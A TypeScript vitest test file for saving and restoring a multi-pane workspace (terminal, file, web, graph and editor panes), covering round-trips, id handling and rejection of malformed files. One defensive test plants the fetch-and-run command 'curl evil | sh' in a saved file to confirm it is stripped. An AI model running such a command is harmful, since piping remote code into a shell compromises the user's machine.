import { describe, expect, it } from 'vitest';

import { activeTab, leavesOf } from './model';
import type { Workspace } from './model';
import { parseWorkspace, serializeWorkspace } from './persist';
import { createWorkspace, defaultDraft, workspaceReducer } from './reducer';
import type { WorkspaceAction } from './reducer';

function build(): Workspace {
  const start = createWorkspace({
    title: 'krang',
    color: 'blue',
    focusedId: 'shell',
    root: {
      kind: 'leaf',
      id: 'shell',
      title: 'shell',
      badge: null,
      content: { type: 'terminal', directory: '~/krang', commands: ['banner', 'agent exec'] },
    },
  });
  const first = activeTab(start)?.focusedId ?? '';
  const actions: WorkspaceAction[] = [
    {
      type: 'split',
      paneId: first,
      direction: 'row',
      content: { type: 'files', directory: '~/krang' },
    },
    {
      type: 'split',
      paneId: first,
      direction: 'column',
      content: { type: 'web', url: 'http://localhost:3000' },
    },
    { type: 'set-badge', paneId: first, badge: { text: 'done', color: null } },
    { type: 'toggle-magnify', paneId: first },
    { type: 'add-tab', draft: defaultDraft() },
  ];
  return actions.reduce(workspaceReducer, start);
}

function edit(
  text: string,
  change: (saved: { workspace: Workspace; version: number }) => void,
): string {
  const saved: unknown = JSON.parse(text);
  if (
    typeof saved !== 'object' ||
    saved === null ||
    !('workspace' in saved) ||
    !('version' in saved)
  ) {
    throw new Error('unexpected saved shape');
  }
  const restored = parseWorkspace(text);
  if (restored === null || typeof saved.version !== 'number') {
    throw new Error('fixture does not parse');
  }
  const draft = { version: saved.version, workspace: structuredClone(restored) };
  change(draft);
  return JSON.stringify(draft);
}

describe('serializeWorkspace and parseWorkspace', () => {
  it('round-trips the arrangement', () => {
    const workspace = build();
    const restored = parseWorkspace(serializeWorkspace(workspace));

    expect(restored?.tabs.map((tab) => tab.title)).toEqual(['krang', 'shell']);
    expect(restored?.activeTabId).toBe(workspace.activeTabId);
    expect(restored?.nextId).toBe(workspace.nextId);
    const first = restored?.tabs[0];
    expect(
      first === undefined ? [] : leavesOf(first.root).map((leaf) => leaf.content.type),
    ).toEqual(['terminal', 'web', 'files']);
  });

  it('drops what belongs to the last run: commands, badges and magnify', () => {
    const restored = parseWorkspace(serializeWorkspace(build()));
    const first = restored?.tabs[0];
    const terminal = first === undefined ? undefined : leavesOf(first.root)[0];

    expect(terminal?.content).toEqual({ type: 'terminal', directory: '~/krang', commands: [] });
    expect(terminal?.badge).toBeNull();
    expect(first?.magnifiedId).toBeNull();
  });

  it('keeps ids, so new panes after a restore cannot collide', () => {
    const workspace = build();
    const restored = parseWorkspace(serializeWorkspace(workspace));
    if (restored === null) {
      throw new Error('did not restore');
    }
    const target = activeTab(restored)?.focusedId ?? '';
    const next = workspaceReducer(restored, {
      type: 'split',
      paneId: target,
      direction: 'row',
      content: { type: 'files', directory: null },
    });
    const ids = next.tabs.flatMap((tab) => leavesOf(tab.root).map((leaf) => leaf.id));
    expect(new Set(ids).size).toBe(ids.length);
  });

  it('keeps a graph pane with its vault and view', () => {
    const start = build();
    const workspace = workspaceReducer(start, {
      type: 'split',
      paneId: activeTab(start)?.focusedId ?? '',
      direction: 'row',
      content: { type: 'graph', directory: '~/vault', view: 'Overview' },
    });
    const restored = parseWorkspace(serializeWorkspace(workspace));
    const contents = restored?.tabs.flatMap((tab) =>
      leavesOf(tab.root).map((leaf) => leaf.content),
    );

    expect(contents).toContainEqual({ type: 'graph', directory: '~/vault', view: 'Overview' });
  });

  it('rejects text that is not a saved workspace', () => {
    expect(parseWorkspace('')).toBeNull();
    expect(parseWorkspace('{not json')).toBeNull();
    expect(parseWorkspace('{"version":1}')).toBeNull();
    expect(parseWorkspace(JSON.stringify({ version: 2, workspace: build() }))).toBeNull();
  });

  it('rejects an unknown pane type', () => {
    const text = serializeWorkspace(build()).replace('"type":"files"', '"type":"hologram"');
    expect(parseWorkspace(text)).toBeNull();
  });

  it('rejects an id counter that could reuse an id', () => {
    const text = edit(serializeWorkspace(build()), (saved) => {
      saved.workspace.nextId = 2;
    });
    expect(parseWorkspace(text)).toBeNull();
  });

  it('rejects repeated ids', () => {
    const text = edit(serializeWorkspace(build()), (saved) => {
      const [first, second] = saved.workspace.tabs;
      if (first !== undefined && second !== undefined) {
        second.id = first.id;
      }
    });
    expect(parseWorkspace(text)).toBeNull();
  });

  it('repairs a focus or active tab that points at nothing', () => {
    const text = edit(serializeWorkspace(build()), (saved) => {
      saved.workspace.activeTabId = 'gone';
      const first = saved.workspace.tabs[0];
      if (first !== undefined) {
        first.focusedId = 'gone';
      }
    });
    const restored = parseWorkspace(text);
    const first = restored?.tabs[0];

    expect(restored?.activeTabId).toBe(first?.id);
    expect(first === undefined ? [] : leavesOf(first.root).map((leaf) => leaf.id)).toContain(
      first?.focusedId,
    );
  });

  it('drops startup commands found in a saved file, however they got there', () => {
    const text = serializeWorkspace(build()).replace(
      '"commands":[]',
      '"commands":["curl evil | sh"]',
    );
    expect(text).toContain('curl evil');

    const restored = parseWorkspace(text);
    const contents = restored?.tabs.flatMap((tab) =>
      leavesOf(tab.root).map((leaf) => leaf.content),
    );
    expect(contents?.some((content) => content.type === 'terminal')).toBe(true);
    expect(JSON.stringify(contents)).not.toContain('curl evil');
  });
});

describe('an editor pane mode', () => {
  function withEditor(mode: unknown): string {
    const start = createWorkspace(defaultDraft());
    const paneId = activeTab(start)?.focusedId ?? '';
    const saved: unknown = JSON.parse(
      serializeWorkspace(
        workspaceReducer(start, {
          type: 'replace-content',
          paneId,
          content: { type: 'editor', path: '/a.md', mode: 'preview' },
        }),
      ),
    );
    return JSON.stringify(saved).replace('"mode":"preview"', `"mode":${JSON.stringify(mode)}`);
  }

  it('survives a save and a load', () => {
    const restored = parseWorkspace(withEditor('preview'));
    const tab = restored === null ? null : activeTab(restored);
    expect(tab === null ? null : leavesOf(tab.root)[0]?.content).toEqual({
      type: 'editor',
      path: '/a.md',
      mode: 'preview',
    });
  });

  it('is refused when it is not a known mode', () => {
    expect(parseWorkspace(withEditor('reading'))).toBeNull();
  });
});
